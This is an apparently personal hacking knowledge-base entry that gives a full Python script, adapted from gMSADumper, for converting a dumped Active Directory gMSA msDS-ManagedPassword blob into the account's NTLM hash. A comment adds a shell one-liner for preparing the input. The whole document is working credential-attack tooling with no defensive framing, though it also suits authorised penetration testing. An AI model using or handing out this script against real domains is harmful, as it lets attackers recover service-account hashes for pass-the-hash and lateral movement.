# python scripting
## convert a GMSA managed password structure to a NTLM hash
~/kb/hacking/windows/convert-msds-managed-password-to-ntlm-hash.py
```python
#!/usr/bin/python3
# convert a GMSA managed password structure to a NTLM hash
## input file - managed_password.hex
## the value of msDS-ManagedPassword is decimal numbers representing bytes, one per line. convert to hex.
## $ cat managed_password | awk '{ printf("%.2x", $1) }' > managed_password.hex
## most of this taken from gMSADumper https://github.com/micahvandeusen/gMSADumper
## coyote0x90
from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
import argparse
import binascii
from Cryptodome.Hash import MD4
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
import sys

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

f = open("managed_password.hex", "r")
mp_hex = f.read()
mp_bytes = bytes.fromhex(mp_hex)
f.close()

blob = MSDS_MANAGEDPASSWORD_BLOB()
blob.fromString(mp_bytes)
hash = MD4.new ()
hash.update (blob['CurrentPassword'][:-2])
ntlm = binascii.hexlify(hash.digest()).decode("utf-8")
print(ntlm)

```

